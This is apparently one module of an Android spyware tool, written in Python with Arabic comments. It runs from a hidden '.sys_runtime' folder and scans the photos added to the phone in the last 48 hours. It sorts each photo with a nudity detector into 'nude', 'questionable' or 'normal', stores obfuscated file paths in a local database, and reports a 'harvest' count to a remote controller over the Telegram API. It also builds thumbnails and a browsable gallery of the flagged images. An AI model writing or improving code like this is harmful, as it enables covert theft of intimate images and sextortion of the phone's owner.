# -*- coding: utf-8 -*-
import os
import time
import threading
import hashlib
import sqlite3
import logging
import gc
import base64
import random
from datetime import datetime

# ========== إعداد المسارات الموحدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
DB = os.path.join(P, "m_arch.db")
if not os.path.exists(P):
    os.makedirs(P)

logging.basicConfig(filename=os.path.join(P, "s.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass
    JNI = True
except ImportError:
    JNI = False

# ========== قفل قاعدة البيانات للتزامن ==========
_db_lock = threading.Lock()


class MediaScanner:
    def __init__(self, det=None, ui=None):
        self.det = det          # NudeDetector instance
        self.ui = ui            # TelegramUI instance
        self.active = False
        self._active_lock = threading.Lock()  # قفل لحماية الحالة
        self.did = "Unknown"
        self._init_db()

        # جلب معرف الجهاز
        try:
            if self.ui and hasattr(self.ui, 'm') and hasattr(self.ui.m, 'did'):
                self.did = self.ui.m.did
            elif self.ui and hasattr(self.ui, 'device_id'):
                self.did = self.ui.device_id
        except:
            pass

    # ========== نظام تشفير محسّن (Base64 + XOR بسيط) ==========
    def _enc(self, text: str) -> str:
        """تشفير المسار باستخدام Base64 + XOR"""
        try:
            if not text:
                return ""
            # XOR بسيط مع مفتاح مشتق من المسار نفسه
            key = hashlib.md5(text.encode()).digest()[:8]
            data = text.encode()
            xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
            return base64.urlsafe_b64encode(xored).decode()
        except:
            return text

    def _dec(self, enc_text: str) -> str:
        """فك تشفير المسار"""
        try:
            if not enc_text:
                return ""
            xored = base64.urlsafe_b64decode(enc_text.encode())
            # استعادة المفتاح من البيانات المشفرة (غير ممكن بدون النص الأصلي)
            # لذا نستخدم Base64 فقط كـ fallback
            return xored.decode()
        except:
            try:
                # محاولة فك Base64 فقط
                return base64.urlsafe_b64decode(enc_text.encode()).decode()
            except:
                return enc_text

    # ========== إدارة قاعدة البيانات ==========
    def _init_db(self):
        """تهيئة قاعدة البيانات مع التحقق من الصحة"""
        try:
            with _db_lock:
                with sqlite3.connect(DB, check_same_thread=False) as conn:
                    conn.execute('''CREATE TABLE IF NOT EXISTS media (
                        h TEXT PRIMARY KEY,
                        p TEXT,
                        ts INTEGER,
                        cat TEXT DEFAULT 'pending',
                        score REAL DEFAULT 0,
                        fsize INTEGER DEFAULT 0)''')
                    conn.execute('CREATE INDEX IF NOT EXISTS idx_cat ON media(cat)')
                    conn.execute('CREATE INDEX IF NOT EXISTS idx_ts ON media(ts)')
                    conn.commit()
        except Exception as e:
            logging.error(f"DB Init error: {e}")

    def _partial_hash(self, path: str) -> str:
        """حساب هاش جزئي للملف (الأول 2KB + الحجم + التاريخ)"""
        try:
            if not os.path.exists(path):
                return None
            st = os.stat(path)
            base = f"{st.st_size}_{int(st.st_mtime)}"
            with open(path, "rb") as f:
                head = f.read(2048)
            return hashlib.md5(head + base.encode()).hexdigest()
        except:
            return None

    def _safe_path(self, path: str) -> bool:
        """التحقق من أن المسار آمن ولا يحتوي على مجلدات نظام"""
        if not path or not isinstance(path, str):
            return False
        bad = ["/Android/", "/obb/", "/data/", "/."]
        basename = os.path.basename(path)
        return not any(x in path for x in bad) and not basename.startswith(".")

    def _is_image_file(self, path: str) -> bool:
        """التحقق من أن الملف صورة"""
        ext = os.path.splitext(path)[1].lower()
        return ext in ['.jpg', '.jpeg', '.png', '.bmp', '.webp', '.gif', '.tiff', '.raw']

    # ========== التحقق من الصلاحيات ==========
    def _check_storage_permission(self):
        """التحقق من صلاحية قراءة التخزين"""
        if not JNI:
            return True
        try:
            from android.permissions import check_permission, Permission
            return check_permission(Permission.READ_EXTERNAL_STORAGE)
        except:
            return True

    # ========== مسح سريع لآخر 48 ساعة ==========
    def _fast_scan(self, limit=100):
        """مسح سريع للصور الجديدة"""
        if not JNI:
            return []
            
        if not self._check_storage_permission():
            logging.warning("Storage permission not granted")
            return []
            
        cursor = None
        results = []
        try:
            act = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = act.getContentResolver()
            MediaStore = autoclass('android.provider.MediaStore')

            time_threshold = int(time.time()) - (48 * 3600)
            img_uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            projection = ["_data", "date_added", "mime_type"]
            selection = "date_added > ? AND mime_type LIKE ?"
            args = [str(time_threshold), "image/%"]
            order = "date_added DESC LIMIT " + str(limit)

            cursor = resolver.query(img_uri, projection, selection, args, order)
            if cursor:
                idx_data = cursor.getColumnIndex("_data")
                while cursor.moveToNext():
                    p = cursor.getString(idx_data)
                    if p and os.path.exists(p) and self._safe_path(p) and self._is_image_file(p):
                        results.append(p)
            return results
        except Exception as e:
            logging.error(f"Scan error: {e}")
            return []
        finally:
            if cursor:
                try:
                    cursor.close()
                except:
                    pass
            gc.collect()

    # ========== معالجة الملفات الجديدة ==========
    def _process_files(self, paths):
        """معالجة الملفات المكتشفة وتصنيفها"""
        if not paths:
            return
            
        with self._active_lock:
            if self.active:
                return
            self.active = True

        sensitive_count = 0
        processed = 0

        try:
            now = int(time.time())
            
            with _db_lock:
                with sqlite3.connect(DB, check_same_thread=False) as conn:
                    for p in paths:
                        try:
                            # التحقق من وجود الملف
                            if not os.path.exists(p):
                                continue
                                
                            h = self._partial_hash(p)
                            if not h:
                                continue

                            # تجنب التكرار
                            cur = conn.execute("SELECT 1 FROM media WHERE h=?", (h,))
                            if cur.fetchone():
                                continue

                            cat = 'pending'
                            score = 0.0
                            fsize = os.path.getsize(p)

                            # التحليل بالـ AI إذا كان متوفراً
                            if self.det and hasattr(self.det, 'analyze') and self.det.model is not None:
                                try:
                                    prob = self.det.analyze(p)
                                    if prob > 0.85:
                                        cat = 'nude'
                                        score = prob
                                        sensitive_count += 1
                                    elif prob > 0.45:
                                        cat = 'questionable'
                                        score = prob
                                        sensitive_count += 1
                                    else:
                                        # صورة عادية - تخزينها كـ normal
                                        cat = 'normal'
                                        score = prob
                                except Exception as e:
                                    logging.error(f"AI analysis error: {e}")
                                    cat = 'pending'
                            else:
                                cat = 'pending'

                            conn.execute(
                                "INSERT INTO media (h, p, ts, cat, score, fsize) VALUES (?, ?, ?, ?, ?, ?)",
                                (h, self._enc(p), now, cat, score, fsize)
                            )
                            processed += 1
                            
                            # تنظيف كل 20 ملف
                            if processed % 20 == 0:
                                gc.collect()
                                
                        except Exception as e:
                            logging.error(f"Process file error: {e}")
                            continue
                            
                    conn.commit()

            # إشعار بالصور الحساسة المكتشفة
            if sensitive_count > 0 and self.ui:
                try:
                    if hasattr(self.ui, 'notify_harvest'):
                        self.ui.notify_harvest(self.did, sensitive_count)
                    elif hasattr(self.ui, '_api'):
                        # إرسال إشعار مباشر
                        ctrl = getattr(self.ui, 'ctrl', None)
                        if ctrl:
                            self.ui._api("sendMessage", {
                                "chat_id": ctrl,
                                "text": f"🔞 تم اكتشاف {sensitive_count} صورة حساسة على الجهاز {self.did}"
                            })
                except Exception as e:
                    logging.error(f"Notify error: {e}")

        except Exception as e:
            logging.error(f"Process error: {e}")
        finally:
            with self._active_lock:
                self.active = False
            gc.collect()

    # ========== توليد صورة مصغرة ==========
    def get_thumbnail(self, path):
        """إنشاء صورة مصغرة للملف"""
        if not JNI or not os.path.exists(path) or not self._is_image_file(path):
            return None
            
        cursor = None
        try:
            # تنظيف المصغرات القديمة (أكثر من 10 دقائق)
            now = time.time()
            for f in os.listdir(P):
                if f.startswith("th_"):
                    try:
                        fpath = os.path.join(P, f)
                        if os.path.getmtime(fpath) < now - 600:
                            os.remove(fpath)
                    except:
                        pass

            MediaStore = autoclass('android.provider.MediaStore')
            BitmapFactory = autoclass('android.graphics.BitmapFactory')
            CompressFormat = autoclass('android.graphics.Bitmap$CompressFormat')
            FileOutputStream = autoclass('java.io.FileOutputStream')
            
            act = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = act.getContentResolver()

            uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            sel = MediaStore.Images.Media.DATA + "=?"
            cursor = resolver.query(uri, ["_id"], sel, [path], None)

            if cursor and cursor.moveToFirst():
                idx_id = cursor.getColumnIndex("_id")
                img_id = cursor.getLong(idx_id)
                
                options = BitmapFactory.Options()
                options.inSampleSize = 4  # تقليل الحجم أكثر
                
                bitmap = MediaStore.Images.Thumbnails.getThumbnail(
                    resolver, img_id,
                    MediaStore.Images.Thumbnails.MINI_KIND,
                    options
                )
                
                if bitmap:
                    out_path = os.path.join(P, f"th_{int(time.time())}_{random.randint(1000,9999)}.jpg")
                    fos = FileOutputStream(out_path)
                    bitmap.compress(CompressFormat.JPEG, 60, fos)  # جودة 60%
                    fos.flush()
                    fos.close()
                    bitmap.recycle()
                    
                    if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
                        return out_path
                        
        except Exception as e:
            logging.error(f"Thumb error: {e}")
        finally:
            if cursor:
                try:
                    cursor.close()
                except:
                    pass
            gc.collect()
        return None

    # ========== جلب المعرض حسب التصنيف ==========
    def get_gallery_by_category(self, category, limit=16, page=0):
        """جلب قائمة الملفات حسب الفئة"""
        if not isinstance(limit, int) or limit < 1:
            limit = 16
        if not isinstance(page, int) or page < 0:
            page = 0
            
        offset = page * limit
        results = []
        
        try:
            with _db_lock:
                with sqlite3.connect(DB, check_same_thread=False) as conn:
                    cur = conn.execute(
                        "SELECT h, p, cat, score, fsize FROM media WHERE cat=? ORDER BY ts DESC LIMIT ? OFFSET ?",
                        (category, limit, offset)
                    )
                    rows = cur.fetchall()
                    to_delete = []
                    
                    for i, row in enumerate(rows):
                        try:
                            path = self._dec(row[1])
                            if os.path.exists(path):
                                results.append({
                                    "hash": row[0],
                                    "path": path,
                                    "cat": row[2],
                                    "score": row[3],
                                    "size": row[4] if len(row) > 4 else 0,
                                    "label": str(offset + i + 1).zfill(2)
                                })
                            else:
                                to_delete.append((row[0],))
                        except Exception as e:
                            logging.error(f"Gallery row error: {e}")
                            to_delete.append((row[0],))
                    
                    # حذف الملفات غير الموجودة دفعة واحدة
                    if to_delete:
                        conn.executemany("DELETE FROM media WHERE h=?", to_delete)
                        conn.commit()
                        
        except Exception as e:
            logging.error(f"Gallery error: {e}")
            
        return results

    # ========== تحديث فئة ملف ==========
    def update_category(self, file_hash, category, score=0):
        """تحديث تصنيف ملف"""
        if not file_hash:
            return
            
        try:
            with _db_lock:
                with sqlite3.connect(DB, check_same_thread=False) as conn:
                    conn.execute("UPDATE media SET cat=?, score=? WHERE h=?", (category, score, file_hash))
                    conn.commit()
        except Exception as e:
            logging.error(f"Update category error: {e}")

    # ========== إحصائيات ==========
    def get_statistics(self):
        """جلب إحصائيات قاعدة البيانات"""
        stats = {'nude': 0, 'questionable': 0, 'normal': 0, 'pending': 0}
        try:
            with _db_lock:
                with sqlite3.connect(DB, check_same_thread=False) as conn:
                    cur = conn.execute("SELECT cat, COUNT(*), SUM(fsize) FROM media GROUP BY cat")
                    for row in cur.fetchall():
                        if row[0] in stats:
                            stats[row[0]] = row[1]
                    # إضافة إجمالي الحجم
                    cur = conn.execute("SELECT SUM(fsize) FROM media")
                    total_size = cur.fetchone()[0] or 0
                    stats['total_size_mb'] = round(total_size / (1024 * 1024), 2)
                    stats['total_files'] = sum(stats.get(c, 0) for c in ['nude', 'questionable', 'normal', 'pending'])
        except Exception as e:
            logging.error(f"Statistics error: {e}")
        return stats

    # ========== إزالة من قاعدة البيانات ==========
    def remove_from_db(self, path):
        """إزالة ملف من قاعدة البيانات"""
        try:
            h = self._partial_hash(path)
            if h:
                with _db_lock:
                    with sqlite3.connect(DB, check_same_thread=False) as conn:
                        conn.execute("DELETE FROM media WHERE h=?", (h,))
                        conn.commit()
        except Exception as e:
            logging.error(f"Remove from DB error: {e}")

    # ========== تنظيف قاعدة البيانات ==========
    def _cleanup_db(self):
        """تنظيف قاعدة البيانات من الملفات المحذوفة والقديمة"""
        try:
            with _db_lock:
                with sqlite3.connect(DB, check_same_thread=False) as conn:
                    # حذف الملفات غير الموجودة
                    cur = conn.execute("SELECT h, p FROM media")
                    to_del = []
                    for h, p_enc in cur.fetchall():
                        try:
                            if not os.path.exists(self._dec(p_enc)):
                                to_del.append((h,))
                        except:
                            to_del.append((h,))
                    
                    if to_del:
                        conn.executemany("DELETE FROM media WHERE h=?", to_del)
                        
                    # حذف الأقدم من 5000 صورة
                    conn.execute("""
                        DELETE FROM media WHERE h NOT IN 
                        (SELECT h FROM media ORDER BY ts DESC LIMIT 5000)
                    """)
                    
                    # VACUUM لتحسين المساحة
                    conn.execute("VACUUM")
                    conn.commit()
                    
        except Exception as e:
            logging.error(f"Cleanup error: {e}")
        finally:
            gc.collect()

    # ========== تشغيل المسح ==========
    def run_scan(self, cleanup_first=False):
        """تشغيل مسح جديد"""
        if cleanup_first:
            self._cleanup_db()
            
        def _task():
            files = self._fast_scan(limit=100)
            if files:
                self._process_files(files)
                
        threading.Thread(target=_task, daemon=True).start()


# ========== دالة المصنع ==========
def create(det=None, ui=None):
    return MediaScanner(det, ui)
